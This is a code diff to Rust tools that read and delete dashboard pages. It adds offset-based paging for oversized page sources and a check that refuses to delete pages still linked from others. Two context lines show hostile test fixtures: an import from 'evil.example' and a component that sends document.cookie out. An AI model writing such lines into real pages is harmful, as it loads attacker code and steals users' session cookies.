@@ -688,7 +688,7 @@ impl Tool for PagesReadTool {
     fn description(&self) -> &str {
         "Read one dashboard page's manifest (title, description, icon, nav visibility) and its \
          `page.tsx` source, by `slug`. USE FOR reviewing or revising a page you or a teammate \
-         already built."
+         already built. Oversized sources are size-capped; use the returned offset to continue."
     }
 
     fn parameters_schema(&self) -> Value {
@@ -698,6 +698,11 @@ impl Tool for PagesReadTool {
                 "slug": {
                     "type": "string",
                     "description": "The page's slug, as shown by pages_list, e.g. \"revenue-overview\"."
+                },
+                "offset": {
+                    "type": "integer",
+                    "minimum": 0,
+                    "description": "Start at this byte offset in page.tsx; defaults to zero. Use the next offset returned by a capped read."
                 }
             },
             "required": ["slug"],
@@ -721,6 +726,17 @@ impl Tool for PagesReadTool {
                  and contain only lowercase letters, digits and hyphens."
             )));
         }
+        let offset = match args.get("offset") {
+            None => 0,
+            Some(value) => match value.as_u64().and_then(|n| usize::try_from(n).ok()) {
+                Some(offset) => offset,
+                None => {
+                    return Ok(ToolResult::error(
+                        "Invalid arguments: `offset` must be a nonnegative integer.".to_string(),
+                    ));
+                }
+            },
+        };
 
         let bundle = match self.pages.page(slug).await {
             Ok(bundle) => bundle,
@@ -770,8 +786,26 @@ impl Tool for PagesReadTool {
                          page.tsx ---\n",
                         rev = node.updated_at_millis
                     ));
-                    out.push_str(&body);
+                    let start = offset.min(body.len());
+                    if !body.is_char_boundary(start) {
+                        return Ok(ToolResult::error(format!(
+                            "Invalid arguments: `offset` {start} is not a UTF-8 boundary in \
+                             `{slug}`'s page.tsx."
+                        )));
+                    }
+                    let end = crate::store::text::floor_boundary(
+                        &body,
+                        start.saturating_add(MAX_SOURCE_BYTES).min(body.len()),
+                    );
+                    out.push_str(&body[start..end]);
                     out.push_str("\n--- END page.tsx ---\n");
+                    if end < body.len() {
+                        out.push_str(&format!(
+                            "Source is size-capped; bytes {start}..{end} of {} are shown. Continue \
+                             with `pages_read({{\"slug\":\"{slug}\",\"offset\":{end}}})`.\n",
+                            body.len(),
+                        ));
+                    }
                 }
                 _ => out.push_str("Its `page.tsx` could not be read.\n"),
             },
@@ -1179,6 +1213,33 @@ impl PagesDeleteTool {
     fn new(pages: CompanyPages) -> Self {
         Self { pages }
     }
+
+    async fn referrers(&self, target_slug: &str) -> crate::Result<Vec<String>> {
+        let needle = format!("/pages/{target_slug}");
+        let mut referrers = Vec::new();
+        for (slug, bundle) in self.pages.all_pages().await? {
+            if slug == target_slug {
+                continue;
+            }
+            let Some(source) = bundle.source else {
+                continue;
+            };
+            if let Some((_, body)) = self
+                .pages
+                .store
+                .read(&self.pages.company, &source.id)
+                .await?
+                && body.match_indices(&needle).any(|(at, _)| {
+                    body[at + needle.len()..].chars().next().is_none_or(|next| {
+                        !(next.is_ascii_lowercase() || next.is_ascii_digit() || next == '-')
+                    })
+                })
+            {
+                referrers.push(slug);
+            }
+        }
+        Ok(referrers)
+    }
 }
 
 #[async_trait]
@@ -1189,7 +1250,7 @@ impl Tool for PagesDeleteTool {
 
     fn description(&self) -> &str {
         "Permanently remove one internal dashboard page and everything in it, by `slug`. This \
-         cannot be undone."
+         cannot be undone. Refuses deletion while another page links to the target."
     }
 
     fn parameters_schema(&self) -> Value {
@@ -1234,6 +1295,26 @@ impl Tool for PagesDeleteTool {
                 "No page named `{slug}`. Call `{PAGES_LIST_TOOL}` to see what exists."
             )));
         };
+
+        let referrers = match self.referrers(slug).await {
+            Ok(referrers) => referrers,
+            Err(e) => {
+                return Ok(ToolResult::error(format!(
+                    "Could not check whether other pages link to `{slug}`: {reason}.",
+                    reason = store_reason(&e),
+                )));
+            }
+        };
+        if !referrers.is_empty() {
+            return Ok(ToolResult::error(format!(
+                "Refused: page `{slug}` is linked from {}. Update those pages before deleting it.",
+                referrers
+                    .iter()
+                    .map(|referrer| format!("`{referrer}`"))
+                    .collect::<Vec<_>>()
+                    .join(", "),
+            )));
+        }
 
         match self
             .pages
@@ -1817,7 +1898,6 @@ export * from "https://evil.example/x.js";
     /// console edit, a `workspace_write`, a body written before the cap existed
     /// — is returned in full and overflows the budget the cap was derived from.
     #[tokio::test]
-    #[ignore = "pages_read never clamps the source body: an oversized page.tsx overflows the budget"]
     async fn pages_read_stays_within_the_budget_when_the_stored_source_exceeds_the_cap() {
         let (_dir, store) = store().await;
         let company = CompanyId::new("acme");
@@ -1908,7 +1988,6 @@ export default function Page() { send(document.cookie); return <div/>; }
     /// link in a dashboard nobody edited. The safe answer is to name the
     /// referrers before destroying the target.
     #[tokio::test]
-    #[ignore = "pages_delete performs no referential-integrity check against other pages' links"]
     async fn pages_delete_names_the_pages_that_link_to_the_slug_it_is_about_to_remove() {
         let (_dir, store) = store().await;
         let pages = pages(store, "acme");
